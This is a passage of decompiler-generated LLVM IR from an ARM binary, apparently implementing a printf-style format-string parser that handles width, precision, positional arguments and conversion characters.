  %v4_24fc8 = inttoptr i32 %v3_24fc8 to i8*
  store i8 %v3_24fbc, i8* %v4_24fc8, align 1
  %v0_24fcc = load i32, i32* %r3.global-to-local, align 4
  %v1_24fcc = add i32 %v0_24fcc, -4
  %v2_24fcc = inttoptr i32 %v1_24fcc to i32*
  %v3_24fcc = load i32, i32* %v2_24fcc, align 4
  store i32 %v3_24fcc, i32* %r3.global-to-local, align 4
  %v0_24fd0 = load i32, i32* %r1.global-to-local, align 4
  %v9_24fd0 = icmp eq i32 %v0_24fd0, %v3_24fcc
  %v0_24fd4 = load i32, i32* %r0.global-to-local, align 4
  %v1_24fd4 = add i32 %v0_24fd4, 1
  store i32 %v1_24fd4, i32* %r0.global-to-local, align 4
  br i1 %v9_24fd0, label %dec_label_pc_24fdc, label %dec_label_pc_254a0

dec_label_pc_24fdc:                               ; preds = %dec_label_pc_24fb4
  %v2_24fdc = icmp eq i32 %v3_24fcc, 0
  br i1 %v2_24fdc, label %dec_label_pc_24fec, label %dec_label_pc_24fe4

dec_label_pc_24fe4:                               ; preds = %dec_label_pc_24fdc
  %tmp182 = icmp ult i32 %v1_24fd4, 32
  br i1 %tmp182, label %dec_label_pc_24fe4.dec_label_pc_24fb4_crit_edge, label %dec_label_pc_24fec

dec_label_pc_24fe4.dec_label_pc_24fb4_crit_edge:  ; preds = %dec_label_pc_24fe4
  %v0_24fb4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_24fb4

dec_label_pc_24fec:                               ; preds = %dec_label_pc_24fe4, %dec_label_pc_24fdc
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_24ff4 = ptrtoint i32* %stack_var_-111 to i32
  store i32 %v2_24ff4, i32* %r0.global-to-local, align 4
  %v0_25004.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_24ff8

dec_label_pc_24ff8:                               ; preds = %.dec_label_pc_24ff8_crit_edge, %dec_label_pc_24fec
  %v3_2502c.pre-phi = phi i32 [ %.pre, %.dec_label_pc_24ff8_crit_edge ], [ %v2_24fc0, %dec_label_pc_24fec ]
  %v0_2502464 = phi i32 [ %v3_24fa8, %.dec_label_pc_24ff8_crit_edge ], [ %v2_24ff4, %dec_label_pc_24fec ]
  %v0_25004 = phi i32 [ ptrtoint (i32* @global_var_44990.1184 to i32), %.dec_label_pc_24ff8_crit_edge ], [ %v0_25004.pre, %dec_label_pc_24fec ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 20828, i32* %r2.global-to-local, align 4
  %v2_25004 = add i32 %v0_25004, -39300
  store i32 %v2_25004, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 -4, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v4_25018 = inttoptr i32 %v2_25004 to i8*
  store i8* %v4_25018, i8** %stack_var_-120, align 4
  br label %dec_label_pc_25024

dec_label_pc_25020:                               ; preds = %.thread20, %dec_label_pc_25154
  %v0_25020 = phi i32 [ %v2_251cc, %.thread20 ], [ %v0_2513076, %dec_label_pc_25154 ]
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.3, %.thread20 ], [ %stack_var_-44.2, %dec_label_pc_25154 ]
  store i32 %v0_25020, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_25024

dec_label_pc_25024:                               ; preds = %dec_label_pc_24ff8, %dec_label_pc_25020
  %v1_25038 = phi i32 [ %v0_2502464, %dec_label_pc_24ff8 ], [ %v0_25020, %dec_label_pc_25020 ]
  %stack_var_-44.1 = phi i32 [ %tmp117, %dec_label_pc_24ff8 ], [ %stack_var_-44.0, %dec_label_pc_25020 ]
  %v1_25024 = inttoptr i32 %v1_25038 to i8*
  %v2_25024 = load i8, i8* %v1_25024, align 1
  %v3_25024 = zext i8 %v2_25024 to i32
  store i32 %v3_25024, i32* %r3.global-to-local, align 4
  %v7_25028 = icmp eq i8 %v2_25024, 42
  br i1 %v7_25028, label %bb, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_25024
  store i32 %v1_25038, i32* %r6.global-to-local, align 4
  %v0_2503c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_2503c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_25084.preheader

bb:                                               ; preds = %dec_label_pc_25024
  %v1_25030 = load i32, i32* %r8.global-to-local, align 4
  %v2_25030 = load i32, i32* %sb.global-to-local, align 4
  %v4_25030 = mul i32 %v2_25030, %v1_25030
  %v5_25030 = add i32 %v4_25030, %v3_2502c.pre-phi
  store i32 %v5_25030, i32* %r3.global-to-local, align 4
  %v2_25038 = add i32 %v1_25038, 1
  store i32 %v2_25038, i32* %r6.global-to-local, align 4
  %v0_2503c111 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_2503c111, i32* %r1.global-to-local, align 4
  %v3_25040 = add i32 %v5_25030, -40
  %v4_25040 = inttoptr i32 %v3_25040 to i32*
  store i32 %v0_2503c111, i32* %v4_25040, align 4
  %v0_25088.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_25084.preheader

dec_label_pc_25084.preheader:                     ; preds = %.thread8, %bb
  %v0_25088.pre = phi i32 [ %v1_25038, %.thread8 ], [ %v0_25088.pre.pre, %bb ]
  %v0_2508c.pre = load i32, i32* @lr, align 4
  %v2_2508c = add i32 %v0_2508c.pre, 20828
  %v3_2508c = inttoptr i32 %v2_2508c to i32*
  br label %dec_label_pc_25084

dec_label_pc_25048:                               ; preds = %dec_label_pc_25084
  store i32 214748363, i32* %r3.global-to-local, align 4
  %v0_2504c = load i32, i32* %r1.global-to-local, align 4
  %v2_2504c = add i32 %v0_2504c, -214748363
  %tmp139 = sub i32 214748362, %v0_2504c
  %v6_2504c = and i32 %tmp139, %v0_2504c
  %v7_2504c = icmp slt i32 %v6_2504c, 0
  %v8_2504c = icmp slt i32 %v2_2504c, 0
  %v9_2504c = icmp eq i32 %v0_2504c, 214748363
  %v3_25050 = xor i1 %v8_2504c, %v7_2504c
  %v4_25050 = or i1 %v9_2504c, %v3_25050
  br i1 %v4_25050, label %dec_label_pc_25068, label %dec_label_pc_25054

dec_label_pc_25054:                               ; preds = %dec_label_pc_25048
  store i32 214748364, i32* %r2.global-to-local, align 4
  %v9_25058 = icmp eq i32 %v0_2504c, 214748364
  br i1 %v9_25058, label %dec_label_pc_25060, label %dec_label_pc_25080

dec_label_pc_25060:                               ; preds = %dec_label_pc_25054
  %v8_25064 = icmp ugt i8 %v2_25088, 55
  br i1 %v8_25064, label %dec_label_pc_25080, label %dec_label_pc_25068

dec_label_pc_25068:                               ; preds = %dec_label_pc_25060, %dec_label_pc_25048
  %v2_2506c = mul i32 %v0_2504c, 10
  %v1_25070 = add i32 %v2_2506c, -48
  store i32 %v1_25070, i32* %r3.global-to-local, align 4
  %v2_25074 = add i32 %v1_25070, %v3_25088
  br label %dec_label_pc_25080

dec_label_pc_25080:                               ; preds = %dec_label_pc_25060, %dec_label_pc_25054, %dec_label_pc_25068
  %storemerge = phi i32 [ %v2_25074, %dec_label_pc_25068 ], [ 2147483647, %dec_label_pc_25054 ], [ 2147483647, %dec_label_pc_25060 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_25080 = add i32 %v0_25108, 1
  store i32 %v1_25080, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_25084

dec_label_pc_25084:                               ; preds = %dec_label_pc_25084.preheader, %dec_label_pc_25080
  %v0_25108 = phi i32 [ %v0_25088.pre, %dec_label_pc_25084.preheader ], [ %v1_25080, %dec_label_pc_25080 ]
  store i32 20828, i32* %r2.global-to-local, align 4
  %v1_25088 = inttoptr i32 %v0_25108 to i8*
  %v2_25088 = load i8, i8* %v1_25088, align 1
  %v3_25088 = zext i8 %v2_25088 to i32
  store i32 %v3_25088, i32* @ip, align 4
  %v4_2508c = load i32, i32* %v3_2508c, align 4
  store i32 %v4_2508c, i32* %r3.global-to-local, align 4
  %v2_25090 = mul nuw nsw i32 %v3_25088, 2
  store i32 %v2_25090, i32* %r2.global-to-local, align 4
  %v2_25094 = add i32 %v2_25090, %v4_2508c
  %v3_25094 = inttoptr i32 %v2_25094 to i16*
  %v4_25094 = load i16, i16* %v3_25094, align 2
  %v6_25094 = zext i16 %v4_25094 to i32
  store i32 %v6_25094, i32* %r3.global-to-local, align 4
  %v1_25098 = and i32 %v6_25094, 8
  %v2_25098 = icmp eq i32 %v1_25098, 0
  br i1 %v2_25098, label %dec_label_pc_250a0, label %dec_label_pc_25048

dec_label_pc_250a0:                               ; preds = %dec_label_pc_25084
  %v0_250a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_250a0 = add i32 %v0_250a0, -1
  %v2_250a0 = inttoptr i32 %v1_250a0 to i8*
  %v3_250a0 = load i8, i8* %v2_250a0, align 1
  %v4_250a0 = zext i8 %v3_250a0 to i32
  store i32 %v4_250a0, i32* %r3.global-to-local, align 4
  %v7_250a4 = icmp eq i8 %v3_250a0, 37
  br i1 %v7_250a4, label %dec_label_pc_250ac, label %dec_label_pc_2516c

dec_label_pc_250ac:                               ; preds = %dec_label_pc_250a0
  %v7_250ac = icmp eq i8 %v2_25088, 36
  %. = zext i1 %v7_250ac to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_250b8 = load i32, i32* %r1.global-to-local, align 4
  %tmp143 = icmp slt i32 %v0_250b8, 1
  br i1 %tmp143, label %bb144, label %thread-pre-split

bb144:                                            ; preds = %dec_label_pc_250ac
  store i32 0, i32* %r3.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_250ac, %bb144
  %v0_250c0 = phi i32 [ 0, %bb144 ], [ %., %dec_label_pc_250ac ]
  %v2_250c0 = icmp eq i32 %v0_250c0, 0
  %v0_250f4 = load i32, i32* %fp.global-to-local, align 4
  br i1 %v2_250c0, label %dec_label_pc_250f4, label %dec_label_pc_250c8

dec_label_pc_250c8:                               ; preds = %thread-pre-split
  %v2_250f4 = icmp eq i32 %v0_250f4, 0
  %v1_250cc = add i32 %v0_25108, 1
  store i32 %v1_250cc, i32* %r0.global-to-local, align 4
  br i1 %v2_250f4, label %dec_label_pc_254a0, label %dec_label_pc_250d4

dec_label_pc_250d4:                               ; preds = %dec_label_pc_250c8
  %v2_250d4 = sub i32 %v0_250b8, %v0_250f4
  %v4_250d4 = xor i32 %v0_250f4, %v0_250b8
  %v5_250d4 = xor i32 %v2_250d4, %v0_250b8
  %v6_250d4 = and i32 %v5_250d4, %v4_250d4
  %v7_250d4 = icmp slt i32 %v6_250d4, 0
  %v8_250d4 = icmp slt i32 %v2_250d4, 0
  %v9_250d4 = icmp eq i32 %v0_250b8, %v0_250f4
  %v3_250d8 = xor i1 %v8_250d4, %v7_250d4
  %v4_250d8 = or i1 %v9_250d4, %v3_250d8
  br i1 %v4_250d8, label %dec_label_pc_250e8, label %bb145

bb145:                                            ; preds = %dec_label_pc_250d4
  store i32 %v0_250b8, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_250e8

dec_label_pc_250e4:                               ; preds = %dec_label_pc_25108, %dec_label_pc_25110
  %v0_250e4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_250e4, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_250e8

dec_label_pc_250e8:                               ; preds = %bb145, %dec_label_pc_250d4, %dec_label_pc_250e4
  %v0_250e8 = phi i32 [ %v0_250a0, %dec_label_pc_250e4 ], [ %v1_250cc, %dec_label_pc_250d4 ], [ %v1_250cc, %bb145 ]
  %stack_var_-44.2 = phi i32 [ %stack_var_-44.1, %dec_label_pc_250e4 ], [ %v0_250b8, %dec_label_pc_250d4 ], [ %v0_250b8, %bb145 ]
  store i32 %v0_250e8, i32* %r6.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  %v2_25124.pre = load i8*, i8** %stack_var_-120, align 4
  %v3_25124 = ptrtoint i8* %v2_25124.pre to i32
  br label %dec_label_pc_25124

dec_label_pc_250f4:                               ; preds = %thread-pre-split
  %tmp146 = icmp slt i32 %v0_250f4, 1
  br i1 %tmp146, label %dec_label_pc_25108, label %dec_label_pc_250fc

dec_label_pc_250fc:                               ; preds = %dec_label_pc_250f4
  %v7_250fc = icmp eq i8 %v2_25088, 109
  br i1 %v7_250fc, label %dec_label_pc_2516c, label %dec_label_pc_254a0

dec_label_pc_25108:                               ; preds = %dec_label_pc_250f4
  %tmp183 = icmp ugt i32 %v0_25108, %v0_250a0
  br i1 %tmp183, label %dec_label_pc_25110, label %dec_label_pc_250e4

dec_label_pc_25110:                               ; preds = %dec_label_pc_25108
  %v1_25110 = inttoptr i32 %v0_250a0 to i8*
  %v2_25110 = load i8, i8* %v1_25110, align 1
  %v3_25110 = zext i8 %v2_25110 to i32
  store i32 %v3_25110, i32* %r3.global-to-local, align 4
  %v7_25114 = icmp eq i8 %v2_25110, 48
  br i1 %v7_25114, label %dec_label_pc_250e4, label %bb147

bb147:                                            ; preds = %dec_label_pc_25110
  %v1_25118 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_25118, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_2516c

dec_label_pc_25124.loopexit:                      ; preds = %dec_label_pc_2512c
  %v1_25138 = load i32, i32* @r4, align 4
  %v3_25138 = or i32 %v1_25138, %v0_2514c
  store i32 %v3_25138, i32* @r4, align 4
  %v2_2513c = add i32 %v0_2513076, 1
  store i32 %v2_2513c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_25124

dec_label_pc_25124:                               ; preds = %dec_label_pc_25124.loopexit, %dec_label_pc_250e8
  %v0_2513076 = phi i32 [ %v2_2513c, %dec_label_pc_25124.loopexit ], [ %v0_250e8, %dec_label_pc_250e8 ]
  store i32 %v3_25124, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_25130 = inttoptr i32 %v0_2513076 to i8*
  br label %dec_label_pc_2512c

dec_label_pc_2512c:                               ; preds = %dec_label_pc_25144, %dec_label_pc_25124
  %v0_2514c = phi i32 [ %v2_2514c, %dec_label_pc_25144 ], [ 1, %dec_label_pc_25124 ]
  %v0_2512c = phi i32 [ %v5_2512c, %dec_label_pc_25144 ], [ %v3_25124, %dec_label_pc_25124 ]
  %v1_2512c = inttoptr i32 %v0_2512c to i8*
  %v2_2512c = load i8, i8* %v1_2512c, align 1
  %v3_2512c = zext i8 %v2_2512c to i32
  store i32 %v3_2512c, i32* %r2.global-to-local, align 4
  %v5_2512c = add i32 %v0_2512c, 1
  store i32 %v5_2512c, i32* %r0.global-to-local, align 4
  %v2_25130 = load i8, i8* %v1_25130, align 1
  %v3_25130 = zext i8 %v2_25130 to i32
  store i32 %v3_25130, i32* %r3.global-to-local, align 4
  %v9_25134 = icmp eq i8 %v2_25130, %v2_2512c
  br i1 %v9_25134, label %dec_label_pc_25124.loopexit, label %dec_label_pc_25144

dec_label_pc_25144:                               ; preds = %dec_label_pc_2512c
  %v1_25144 = inttoptr i32 %v5_2512c to i8*
  %v2_25144 = load i8, i8* %v1_25144, align 1
  %v3_25144 = zext i8 %v2_25144 to i32
  store i32 %v3_25144, i32* %r3.global-to-local, align 4
  %v2_25148 = icmp eq i8 %v2_25144, 0
  %v2_2514c = mul i32 %v0_2514c, 2
  store i32 %v2_2514c, i32* %r1.global-to-local, align 4
  br i1 %v2_25148, label %dec_label_pc_25154, label %dec_label_pc_2512c

dec_label_pc_25154:                               ; preds = %dec_label_pc_25144
  %v1_25154 = add i32 %v0_2513076, -1
  %v2_25154 = inttoptr i32 %v1_25154 to i8*
  %v3_25154 = load i8, i8* %v2_25154, align 1
  %v7_25158 = icmp eq i8 %v3_25154, 37
  %v0_2515c = load i32, i32* @r4, align 4
  %v1_2515c = and i32 %v0_2515c, 10
  store i32 %v1_2515c, i32* %r3.global-to-local, align 4
  %v4_25160 = udiv i32 %v1_2515c, 2
  %v5_25160 = sub nuw nsw i32 -1, %v4_25160
  %v6_25160 = and i32 %v0_2515c, %v5_25160
  store i32 %v6_25160, i32* @r4, align 4
  br i1 %v7_25158, label %dec_label_pc_25168, label %dec_label_pc_25020

dec_label_pc_25168:                               ; preds = %dec_label_pc_25154
  %v0_25168 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_25168, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2516c

dec_label_pc_2516c:                               ; preds = %bb147, %dec_label_pc_250a0, %dec_label_pc_250fc, %dec_label_pc_25168
  %v1_251ac = phi i32 [ %v0_2513076, %dec_label_pc_25168 ], [ %v0_25108, %bb147 ], [ %v0_25108, %dec_label_pc_250fc ], [ %v0_25108, %dec_label_pc_250a0 ]
  %v0_251a8 = phi i32 [ %v5_2512c, %dec_label_pc_25168 ], [ %v0_250a0, %bb147 ], [ %v0_250a0, %dec_label_pc_250fc ], [ %v0_250a0, %dec_label_pc_250a0 ]
  %stack_var_-44.3 = phi i32 [ %stack_var_-44.2, %dec_label_pc_25168 ], [ %stack_var_-44.1, %bb147 ], [ %stack_var_-44.1, %dec_label_pc_250fc ], [ %stack_var_-44.1, %dec_label_pc_250a0 ]
  %v1_2516c = inttoptr i32 %v0_251a8 to i8*
  %v2_2516c = load i8, i8* %v1_2516c, align 1
  %v3_2516c = zext i8 %v2_2516c to i32
  store i32 %v3_2516c, i32* %r3.global-to-local, align 4
  %v7_25170 = icmp eq i8 %v2_2516c, 42
  br i1 %v7_25170, label %dec_label_pc_25178, label %dec_label_pc_251b8

dec_label_pc_25178:                               ; preds = %dec_label_pc_2516c
  %v0_25178 = load i32, i32* %fp.global-to-local, align 4
  %v2_25178 = icmp eq i32 %v0_25178, 0
  br i1 %v2_25178, label %dec_label_pc_251a8, label %dec_label_pc_25180

dec_label_pc_25180:                               ; preds = %dec_label_pc_25178
  %v1_25180 = inttoptr i32 %v1_251ac to i8*
  %v2_25180 = load i8, i8* %v1_25180, align 1
  %v3_25180 = zext i8 %v2_25180 to i32
  store i32 %v3_25180, i32* %r3.global-to-local, align 4
  %v7_25184 = icmp eq i8 %v2_25180, 36
  br i1 %v7_25184, label %dec_label_pc_2518c, label %dec_label_pc_254a0

dec_label_pc_2518c:                               ; preds = %dec_label_pc_25180
  %v0_2518c = load i32, i32* %r1.global-to-local, align 4
  %tmp148 = icmp slt i32 %v0_2518c, 1
  br i1 %tmp148, label %dec_label_pc_254a0, label %dec_label_pc_25194

dec_label_pc_25194:                               ; preds = %dec_label_pc_2518c
  %v0_25198 = load i32, i32* %r8.global-to-local, align 4
  %v1_25198 = load i32, i32* %sb.global-to-local, align 4
  %v3_25198 = mul i32 %v1_25198, %v0_25198
  %v4_25198 = add i32 %v3_25198, %v3_2502c.pre-phi
  store i32 %v4_25198, i32* %r3.global-to-local, align 4
  %v1_2519c = add i32 %v1_251ac, 1
  store i32 %v1_2519c, i32* %r6.global-to-local, align 4
  %v2_251a0 = add i32 %v4_25198, -12
  %v3_251a0 = inttoptr i32 %v2_251a0 to i32*
  store i32 %v0_2518c, i32* %v3_251a0, align 4
  br label %dec_label_pc_251b4

dec_label_pc_251a8:                               ; preds = %dec_label_pc_25178
  %v1_251a8 = add i32 %v0_251a8, 1
  store i32 %v1_251a8, i32* %r3.global-to-local, align 4
  %v9_251ac = icmp eq i32 %v1_251a8, %v1_251ac
  br i1 %v9_251ac, label %dec_label_pc_251b4, label %dec_label_pc_254a0

dec_label_pc_251b4:                               ; preds = %dec_label_pc_251a8, %dec_label_pc_25194
  store i32 -2147483648, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_251b8

dec_label_pc_251b8:                               ; preds = %dec_label_pc_2516c, %dec_label_pc_251b4
  %v0_251b8 = load i32, i32* %r8.global-to-local, align 4
  %v2_251b8 = icmp eq i32 %v0_251b8, 0
  br i1 %v2_251b8, label %dec_label_pc_251c4, label %dec_label_pc_251e4.loopexit

dec_label_pc_251c4:                               ; preds = %dec_label_pc_251b8
  %v0_251c4 = load i32, i32* %r6.global-to-local, align 4
  %v1_251c4 = inttoptr i32 %v0_251c4 to i8*
  %v2_251c4 = load i8, i8* %v1_251c4, align 1
  %v3_251c4 = zext i8 %v2_251c4 to i32
  store i32 %v3_251c4, i32* %r3.global-to-local, align 4
  %v7_251c8 = icmp eq i8 %v2_251c4, 46
  br i1 %v7_251c8, label %.thread20, label %dec_label_pc_251dc

.thread20:                                        ; preds = %dec_label_pc_251c4
  %v2_251cc = add i32 %v0_251c4, 1
  store i32 %v2_251cc, i32* %r6.global-to-local, align 4
  %v1_251d0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_251d0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_25020

dec_label_pc_251dc:                               ; preds = %dec_label_pc_251c4
  %v0_251dc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_251dc, i32* %sl.global-to-local, align 4
  store i32 -1, i32* @r5, align 4
  br label %dec_label_pc_251e4

dec_label_pc_251e4.loopexit:                      ; preds = %dec_label_pc_251b8
  %v1_251bc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_251bc, i32* @r5, align 4
  %v0_251f0.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_251e4

dec_label_pc_251e4:                               ; preds = %dec_label_pc_251e4.loopexit, %dec_label_pc_251dc
  %v0_251f0.pre = phi i32 [ %v0_251f0.pre.pre, %dec_label_pc_251e4.loopexit ], [ %v0_251c4, %dec_label_pc_251dc ]
  store i32 -39424, i32* %r3.global-to-local, align 4
  %v0_251e8 = load i32, i32* @lr, align 4
  %v2_251e8 = add i32 %v0_251e8, -39424
  store i32 %v2_251e8, i32* %r1.global-to-local, align 4
  %v1_251f0 = inttoptr i32 %v0_251f0.pre to i8*
  br label %dec_label_pc_251ec

dec_label_pc_251ec:                               ; preds = %dec_label_pc_25200, %dec_label_pc_251e4
  %v0_25200 = phi i32 [ %v1_25200, %dec_label_pc_25200 ], [ %v2_251e8, %dec_label_pc_251e4 ]
  %v1_251ec = inttoptr i32 %v0_25200 to i8*
  %v2_251ec = load i8, i8* %v1_251ec, align 1
  %v3_251ec = zext i8 %v2_251ec to i32
  store i32 %v3_251ec, i32* %r2.global-to-local, align 4
  %v2_251f0 = load i8, i8* %v1_251f0, align 1
  %v3_251f0 = zext i8 %v2_251f0 to i32
  store i32 %v3_251f0, i32* %r3.global-to-local, align 4
  %v9_251f4 = icmp eq i8 %v2_251f0, %v2_251ec
  br i1 %v9_251f4, label %bb149, label %dec_label_pc_25200

bb149:                                            ; preds = %dec_label_pc_251ec
  %v2_251f8 = add i32 %v0_251f0.pre, 1
  store i32 %v2_251f8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_2520c

dec_label_pc_25200:                               ; preds = %dec_label_pc_251ec
  %v1_25200 = add i32 %v0_25200, 1
  %v2_25200 = inttoptr i32 %v1_25200 to i8*
  %v3_25200 = load i8, i8* %v2_25200, align 1
  %v4_25200 = zext i8 %v3_25200 to i32
  store i32 %v4_25200, i32* %r3.global-to-local, align 4
  store i32 %v1_25200, i32* %r1.global-to-local, align 4
  %v2_25204 = icmp eq i8 %v3_25200, 0
  br i1 %v2_25204, label %dec_label_pc_2520c, label %dec_label_pc_251ec

dec_label_pc_2520c:                               ; preds = %dec_label_pc_25200, %bb149
  %v1_25230 = phi i32 [ %v2_251f8, %bb149 ], [ %v0_251f0.pre, %dec_label_pc_25200 ]
  %v1_2522c = phi i32 [ %v0_25200, %bb149 ], [ %v1_25200, %dec_label_pc_25200 ]
  %v2_25214 = sub i32 %v1_2522c, %v2_251e8
  store i32 %v2_25214, i32* %r3.global-to-local, align 4
  %v8_2521c = icmp sgt i32 %v2_25214, 1
  br i1 %v8_2521c, label %.thread24, label %dec_label_pc_25220

dec_label_pc_25220:                               ; preds = %dec_label_pc_2520c
  %v1_25220 = inttoptr i32 %v1_25230 to i8*
  %v2_25220 = load i8, i8* %v1_25220, align 1
  %v3_25220 = zext i8 %v2_25220 to i32
  store i32 %v3_25220, i32* %r2.global-to-local, align 4
  %v1_25224 = inttoptr i32 %v1_2522c to i8*
  %v2_25224 = load i8, i8* %v1_25224, align 1
  %v3_25224 = zext i8 %v2_25224 to i32
  store i32 %v3_25224, i32* %r3.global-to-local, align 4
  %v9_25228 = icmp eq i8 %v2_25220, %v2_25224
  br i1 %v9_25228, label %bb150, label %.thread24

bb150:                                            ; preds = %dec_label_pc_25220
  %v2_2522c = add i32 %v1_2522c, 9
  store i32 %v2_2522c, i32* %r1.global-to-local, align 4
  %v2_25230 = add i32 %v1_25230, 1
  store i32 %v2_25230, i32* %r6.global-to-local, align 4
  br label %.thread24

.thread24:                                        ; preds = %dec_label_pc_25220, %dec_label_pc_2520c, %bb150
  %v0_25238 = phi i32 [ %v1_2522c, %dec_label_pc_25220 ], [ %v1_2522c, %dec_label_pc_2520c ], [ %v2_2522c, %bb150 ]
  %v0_25234 = phi i32 [ %v1_25230, %dec_label_pc_25220 ], [ %v1_25230, %dec_label_pc_2520c ], [ %v2_25230, %bb150 ]
  %v1_25234 = inttoptr i32 %v0_25234 to i8*
  %v2_25234 = load i8, i8* %v1_25234, align 1
  %v3_25234 = zext i8 %v2_25234 to i32
  store i32 %v3_25234, i32* %r2.global-to-local, align 4
  %v1_25238 = add i32 %v0_25238, 9
  %v2_25238 = inttoptr i32 %v1_25238 to i8*
  %v3_25238 = load i8, i8* %v2_25238, align 1
  %v4_25238 = zext i8 %v3_25238 to i32
  store i32 %v4_25238, i32* %r3.global-to-local, align 4
  %v2_2523c = icmp eq i8 %v2_25234, 0
  %v3_25240 = mul nuw nsw i32 %v4_25238, 256
  store i32 %v3_25240, i32* @ip, align 4
  br i1 %v2_2523c, label %dec_label_pc_254a0, label %dec_label_pc_25248

dec_label_pc_25248:                               ; preds = %.thread24
  store i32 -39324, i32* %r3.global-to-local, align 4
  %v2_2524c = add i32 %v0_251e8, -39324
  store i32 %v2_2524c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_25250

dec_label_pc_25250:                               ; preds = %dec_label_pc_252d4, %dec_label_pc_25248
  %v1_25264 = phi i32 [ %v1_252d4, %dec_label_pc_252d4 ], [ %v2_2524c, %dec_label_pc_25248 ]
  %v1_25250 = inttoptr i32 %v1_25264 to i8*
  %v2_25250 = load i8, i8* %v1_25250, align 1
  %v3_25250 = zext i8 %v2_25250 to i32
  store i32 %v3_25250, i32* %r3.global-to-local, align 4
  %v9_25254 = icmp eq i8 %v2_25250, %v2_25234
  br i1 %v9_25254, label %dec_label_pc_2525c, label %dec_label_pc_252d4

dec_label_pc_2525c:                               ; preds = %dec_label_pc_25250
  store i32 %v2_2524c, i32* %r3.global-to-local, align 4
  %v2_25264 = sub i32 %v1_25264, %v2_2524c
  store i32 %v2_25264, i32* %r1.global-to-local, align 4
  %v7_2526c = icmp slt i32 %v2_25264, 18
  br i1 %v7_2526c, label %bb152, label %dec_label_pc_25270

dec_label_pc_25270:                               ; preds = %dec_label_pc_2525c
  %v1_25270 = and i32 %v3_25240, 1024
  %v2_25270 = icmp eq i32 %v1_25270, 0
  br i1 %v2_25270, label %bb152, label %bb151

bb151:                                            ; preds = %dec_label_pc_25270
  %v2_25274 = add i32 %v2_25264, -2
  store i32 %v2_25274, i32* %r1.global-to-local, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_2525c, %dec_label_pc_25270, %bb151
  %v0_2527c = phi i32 [ %v2_25264, %dec_label_pc_2525c ], [ %v2_25264, %dec_label_pc_25270 ], [ %v2_25274, %bb151 ]
  store i32 -39372, i32* %r3.global-to-local, align 4
  %v1_2527c = load i32, i32* %r7.global-to-local, align 4
  %v2_2527c = add i32 %v1_2527c, 32
  %v3_2527c = inttoptr i32 %v2_2527c to i32*
  store i32 %v0_2527c, i32* %v3_2527c, align 4
  %v0_25280 = load i32, i32* @lr, align 4
  %v1_25280 = load i32, i32* %r3.global-to-local, align 4
  %v2_25280 = add i32 %v1_25280, %v0_25280
  store i32 %v2_25280, i32* %r3.global-to-local, align 4
  %v1_25284 = add i32 %v2_25280, -1
  store i32 %v1_25284, i32* %r0.global-to-local, align 4
  %v0_2528c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_25288

dec_label_pc_25288:                               ; preds = %dec_label_pc_25288, %bb152
  %v0_25288 = phi i32 [ %v1_25288, %dec_label_pc_25288 ], [ %v1_25284, %bb152 ]
  %v1_25288 = add i32 %v0_25288, 1
  %v2_25288 = inttoptr i32 %v1_25288 to i8*
  %v3_25288 = load i8, i8* %v2_25288, align 1
  %v4_25288 = zext i8 %v3_25288 to i32
  store i32 %v4_25288, i32* %r3.global-to-local, align 4
  store i32 %v1_25288, i32* %r0.global-to-local, align 4
  %v8_25290 = icmp sgt i32 %v0_2528c.pre, %v4_25288
  br i1 %v8_25290, label %dec_label_pc_25288, label %dec_label_pc_25294

dec_label_pc_25294:                               ; preds = %dec_label_pc_25288
  %v2_2529c.neg = sub i32 39372, %v0_25280
  %v2_252a0 = add i32 %v2_2529c.neg, %v1_25288
  %v2_252a4 = mul i32 %v2_252a0, 2
  store i32 %v2_252a4, i32* %r2.global-to-local, align 4
  %v2_252a8 = add i32 %v0_25280, -39388
  store i32 %v2_252a8, i32* %r3.global-to-local, align 4
  %v2_252ac = add i32 %v2_252a4, %v2_252a8
  %v3_252ac = inttoptr i32 %v2_252ac to i16*
  %v4_252ac = load i16, i16* %v3_252ac, align 2
  %v6_252ac = sext i16 %v4_252ac to i32
  store i32 %v6_252ac, i32* %r1.global-to-local, align 4
  %v2_252b4 = add i32 %v0_25280, -39404
  store i32 %v2_252b4, i32* %r3.global-to-local, align 4
  %v2_252b8 = add i32 %v2_252a4, %v2_252b4
  %v3_252b8 = inttoptr i32 %v2_252b8 to i16*
